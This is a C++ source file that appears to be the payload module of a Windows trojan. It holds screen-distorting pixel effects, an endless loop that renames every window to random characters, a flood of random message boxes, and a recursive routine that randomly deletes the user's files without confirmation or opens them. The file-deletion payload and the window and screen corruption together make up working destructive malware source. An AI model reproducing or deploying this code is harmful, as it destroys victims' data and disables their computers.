#include "payloads.h"

HCRYPTPROV prov;
DWORD xs;

int random() {
	if (prov == NULL)
		if (!CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
			ExitProcess(1);

	int out;
	CryptGenRandom(prov, sizeof(out), (BYTE*)(&out));
	return out & 0x7fffffff;
}

void SeedXorshift32(DWORD dwSeed) {
	xs = dwSeed;
}

DWORD Xorshift32() {
	xs ^= xs << 13;
	xs ^= xs >> 17;
	xs ^= xs << 5;
	return xs;
}

int RotateDC(HDC hdc, int Angle, POINT ptCenter) {
	int nGraphicsMode = SetGraphicsMode(hdc, GM_ADVANCED);
	XFORM xform;
	if (Angle != 0)
	{
		double fangle = (double)Angle / 180. * 3.1415926;
		xform.eM11 = (float)cos(fangle);
		xform.eM12 = (float)sin(fangle);
		xform.eM21 = (float)-sin(fangle);
		xform.eM22 = (float)cos(fangle);
		xform.eDx = (float)(ptCenter.x - cos(fangle) * ptCenter.x + sin(fangle) * ptCenter.y);
		xform.eDy = (float)(ptCenter.y - cos(fangle) * ptCenter.y - sin(fangle) * ptCenter.x);
		SetWorldTransform(hdc, &xform);
	}
	return nGraphicsMode;
}

LPCWSTR GenRandomUnicodeString(int len) {
	wchar_t* strRandom = new wchar_t[len + 1];

	for (int i = 0; i < len; i++) {
		strRandom[i] = (random() % 256) + 1024;
	}

	strRandom[len] = L'\0';

	return strRandom;
}


void ExecuteShader(TROJAN_SHADER shader, int nTime) {
	int dwStartTime = Time;
	HDC hdcScreen = GetDC(NULL);
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();

	BITMAPINFO bmi = { 0 };
	PRGBQUAD prgbScreen;
	HDC hdcTempScreen;
	HBITMAP hbmScreen;

	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = szScreen.cx;
	bmi.bmiHeader.biHeight = szScreen.cy;

	prgbScreen = { 0 };

	hdcTempScreen = CreateCompatibleDC(hdcScreen);
	hbmScreen = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&prgbScreen, NULL, 0);
	SelectObject(hdcTempScreen, hbmScreen);

	for (int i = 0; Time < (dwStartTime + nTime); i++) {
		hdcScreen = GetDC(NULL);
		BitBlt(hdcTempScreen, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, SRCCOPY);
		shader(i, szScreen.cx, szScreen.cy, prgbScreen);
		BitBlt(hdcScreen, 0, 0, szScreen.cx, szScreen.cy, hdcTempScreen, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen);
		DeleteObject(hdcScreen);
		Sleep(10);
	}

	DeleteObject(hbmScreen);
	DeleteDC(hdcTempScreen);
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	Sleep(100);
}

void Shader1(int t, int w, int h, PRGBQUAD prgbScreen) {
	for (int i = 0; i < w * h; i++) {
		prgbScreen[i].rgb = (prgbScreen[i].rgb * 2) % (RGB(255, 255, 255));
	}
}

void Shader2(int t, int w, int h, PRGBQUAD prgbScreen) {
	for (int i = 0; i < w * h; i++) {
		int r = GetRValue(prgbScreen[i].rgb);
		int g = GetGValue(prgbScreen[i].rgb);
		int b = GetBValue(prgbScreen[i].rgb);
		prgbScreen[i].rgb = RGB((r + 100) % 256, ((r + g + b) / 4 + t) % 256, ((r + g + b) / 4 + i) % 256) % (RGB(255, 255, 255)) + t * 10;
	}
}

void Shader3(int t, int w, int h, PRGBQUAD prgbScreen) {
	for (int i = 0; i < w * h; i++) {
		int r = GetRValue(prgbScreen[i].rgb);
		int g = GetGValue(prgbScreen[i].rgb);
		int b = GetBValue(prgbScreen[i].rgb);
		prgbScreen[i].rgb = (RGB((2 * r) % 256, (b + t) % 256, (g + i) % 256) + int(sqrt(i >> t / (r + 1))) / 10) % (RGB(255, 255, 255));
	}
}

void Shader4(int t, int w, int h, PRGBQUAD prgbScreen) {
	for (int i = 0; i < w * h; i++) {
		int r = GetRValue(prgbScreen[i].rgb);
		int g = GetGValue(prgbScreen[i].rgb);
		int b = GetBValue(prgbScreen[i].rgb);
		prgbScreen[i].rgb = (RGB((r + g + b) / 3, (r + g + b) / 3, (r + g + b) / 3) + t - int(sqrt(i))) % (RGB(255, 255, 255));
	}
}

void Shader5(int t, int w, int h, PRGBQUAD prgbScreen) {
	for (int i = 0; i < w * h; i++) {
		prgbScreen[i].rgb = (prgbScreen[i].rgb - Xorshift32() % int(sqrt(i + 1))) % (RGB(255, 255, 255));
	}
}

void Shader6(int t, int w, int h, PRGBQUAD prgbScreen) {
	for (int i = 0; i < w * h; i++) {
		int temp = prgbScreen[i].rgb;
		prgbScreen[i].rgb = prgbScreen[i / 3].rgb;
		prgbScreen[i / 3].rgb = temp;
	}
}

void Shader7(int t, int w, int h, PRGBQUAD prgbScreen) {
	for (int i = 0; i < w * h; i++) {
		int randPixel = Xorshift32() % w;
		int tempB = GetBValue(prgbScreen[i].rgb);
		prgbScreen[i].rgb = RGB(GetBValue(prgbScreen[randPixel].rgb), GetBValue(prgbScreen[randPixel].rgb), GetBValue(prgbScreen[randPixel].rgb));
		prgbScreen[randPixel].rgb = RGB(tempB, tempB, tempB);
	}
}

void Shader8(int t, int w, int h, PRGBQUAD prgbScreen) {
	t *= 10;
	for (int i = 0; i < w; i++) {
		for (int j = 0; j < h; j++) {
			prgbScreen[i * j].rgb = RGB(i % 256, j % 256, t % 256);
		}
	}
}

void Shader9(int t, int w, int h, PRGBQUAD prgbScreen) {
	t *= 50;
	for (int i = 0; i < h; i++) {
		for (int j = 0; j < w; j++) {
			prgbScreen[i * w + j].rgb = RGB((prgbScreen[i * w + j].r + i / 10) % 256, (prgbScreen[i * w + j].g + j / 10) % 256, (prgbScreen[i * w + j].b + t) % 256);
		}
	}
}

void Shader10(int t, int w, int h, PRGBQUAD prgbScreen) {
	for (int i = 0; i < h; i++) {
		for (int j = 0; j < w; j++) {
			int temp1 = (i + Xorshift32() % 11 - 5);
			if (temp1 < 0) {
				temp1 = -temp1;
			}
			int temp2 = (j + Xorshift32() % 11 - 5);
			if (temp2 < 0) {
				temp2 = -temp2;
			}
			prgbScreen[i * w + j].rgb = prgbScreen[(temp1 * w + temp2) % (w * h)].rgb;
		}
	}
}

void Shader11(int t, int w, int h, PRGBQUAD prgbScreen) {
	for (int i = 0; i < w * h; i++) {
		int temp = prgbScreen[i].rgb;
		prgbScreen[i].rgb = prgbScreen[i / 3 * 2].rgb;
		prgbScreen[i / 3 * 2].rgb = temp;
	}
}

void Shader12(int t, int w, int h, PRGBQUAD prgbScreen) {
	PRGBQUAD prgbTemp = { 0 };
	prgbTemp = prgbScreen;
	for (int i = 0; i < h / 2; i++) {
		for (int j = 0; j < w; j++) {
			prgbScreen[i * w + j].rgb = prgbTemp[(int)((float)(i * w + j) + (float)sqrt((2 * (h / 2) * i - i * i))) % (w * h)].rgb;
		}
	}
	for (int i = h / 2; i < h; i++) {
		for (int j = 0; j < w; j++) {
			prgbScreen[i * w + j].rgb = prgbTemp[(int)((float)(i * w + j) + (float)sqrt((2 * (h / 2) * i - i * i))) % (w * h)].rgb;
		}
	}
	Sleep(50);
}

void Shader13(int t, int w, int h, PRGBQUAD prgbScreen) {
	PRGBQUAD prgbTemp = { 0 };
	prgbTemp = prgbScreen;
	for (int i = 0; i < h; i++) {
		for (int j = 0; j < w; j++) {
			prgbScreen[i * w + j].rgb = prgbTemp[(unsigned int)((float)(j * w + i) + (float)sqrt((2 * h * i - i * i))) % (w * h)].rgb;
		}
	}
	Sleep(100);
}

void Shader14(int t, int w, int h, PRGBQUAD prgbScreen) {
	PRGBQUAD prgbTemp = { 0 };
	prgbTemp = prgbScreen;
	for (int i = 0; i < h; i++) {
		for (int j = 0; j < w; j++) {
			prgbScreen[i * w + j].rgb = prgbTemp[(unsigned int)((float)(j * w + i) + (float)sqrt((unsigned int)(2 * h * j - j * j))) % (w * h)].rgb;
		}
	}
	Sleep(100);
}

void Shader15(int t, int w, int h, PRGBQUAD prgbScreen) {
	for (int i = 0; i < w * h; i++) {
		prgbScreen[i].rgb = (t * i) % (RGB(255, 255, 255));
	}
}

void Shader16(int t, int w, int h, PRGBQUAD prgbScreen) {
	for (int i = 0; i < w * h; i++) {
		prgbScreen[i].rgb = (Xorshift32() % 0x100) * 0x010101;
	}
}

BOOL CALLBACK EnumChildWindowsProc(HWND hwnd, LPARAM lParam) {
	SendMessageTimeout(hwnd, WM_SETTEXT, NULL, (LPARAM)GenRandomUnicodeString(random() % 10 + 10), SMTO_ABORTIFHUNG, 100, NULL);

	RECT rcWindow;
	GetWindowRect(hwnd, &rcWindow);
	int cxWindow = rcWindow.right - rcWindow.left;
	int cyWindow = rcWindow.bottom - rcWindow.top;
	HDC hdcWindow = GetDC(hwnd);
	BitBlt(hdcWindow, 0, 0, cxWindow, cyWindow, hdcWindow, random() % 21 - 10, random() % 41 - 20, SRCCOPY);
	ReleaseDC(NULL, hdcWindow);
	DeleteObject(hdcWindow);

	EnumChildWindows(hwnd, EnumChildWindowsProc, NULL);
	return true;
}

void WindowsCorruptionPayload() {
	for (;;) {
		EnumChildWindows(NULL, EnumChildWindowsProc, NULL);
	}
}

void MessageBoxThread() {
	LPCWSTR strText = GenRandomUnicodeString(random() % 10 + 10);
	LPCWSTR strTitle = GenRandomUnicodeString(random() % 10 + 10);
	if (random() % 2 == 0) {
		MessageBox(NULL, strText, strTitle, MB_ABORTRETRYIGNORE | MB_ICONWARNING);
	}
	else {
		MessageBox(NULL, strText, strTitle, MB_RETRYCANCEL | MB_ICONERROR);
	}
}

void MessageBoxPayload() {
	for (;;) {
		CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(MessageBoxThread), NULL, 0, NULL);
		Sleep(1500);
	}
}

void DeleteThread(LPCWSTR strFileName) {
	SHFILEOPSTRUCT shfo = { 0 };
	shfo.hwnd = NULL;
	shfo.wFunc = FO_DELETE;
	shfo.pFrom = strFileName;
	shfo.pTo = NULL;
	shfo.fFlags = FOF_SIMPLEPROGRESS | FOF_NOCONFIRMATION;
	shfo.lpszProgressTitle = L":)";
	SHFileOperation(&shfo);
}

void FileMessPayload(LPWSTR Directory) {
	if (Directory[wcslen(Directory) - 1] != '\\' && wcslen(Directory) < MAX_PATH) {
		lstrcat(Directory, L"\\");
	}

	WCHAR SearchDir[MAX_PATH] = { 0 };
	lstrcpy(SearchDir, Directory);
	lstrcat(SearchDir, L"*.*");

	WIN32_FIND_DATA findData;
	HANDLE hSearch = FindFirstFile(SearchDir, &findData);

	if (hSearch == INVALID_HANDLE_VALUE) {
		return;
	}
	else do {
		if (!lstrcmp(findData.cFileName, L".") || !lstrcmp(findData.cFileName, L"..") || findData.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) {
			continue;
		}

		WCHAR Path[MAX_PATH] = { 0 };
		lstrcpy(Path, Directory);
		lstrcat(Path, findData.cFileName);

		if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			lstrcat(Path, L"\\");
			FileMessPayload(Path);
		}
		else if (random() % 2 == 0 && wcslen(Path) < MAX_PATH) {
			lstrcat(Path, L"\\");
			CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(DeleteThread), (PVOID)Path, 0, NULL);
			Sleep(500);
		}
		else if (random() % 2 == 0) {
			ShellExecute(NULL, L"open", Path, NULL, Directory, SW_SHOW);
			Sleep(500);
		}
	} while (FindNextFile(hSearch, &findData));

	FindClose(hSearch);
}
